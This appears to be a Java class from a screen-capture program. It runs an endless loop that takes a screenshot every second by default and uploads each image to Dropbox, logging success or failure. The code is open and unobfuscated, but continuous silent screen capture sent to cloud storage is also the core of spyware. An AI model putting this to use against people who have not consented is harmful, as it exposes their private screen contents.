public class Timer extends Thread {
    private int milliseconds = 1000; // default 1000

    Timer(int milliseconds) {
        this.milliseconds = milliseconds;
    }

    @Override
    public void run() {
        for (; ; ) {
            try {
                Screenshot screenshot = new Screenshot();
                byte[] imageByte = screenshot.getScreenshot();
                String fileName = new FileName().getFileName();
                DropboxSender dropboxSender = new DropboxSender();
                boolean status = dropboxSender.sendDropboxFile(fileName, imageByte);
                if (status){
                    System.out.println("Success! "+fileName+" uploaded.");
                }else{
                    System.out.println("Error! Screenshot not uploaded.");
                }
                Thread.sleep(milliseconds); //1000 - 1 сек
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
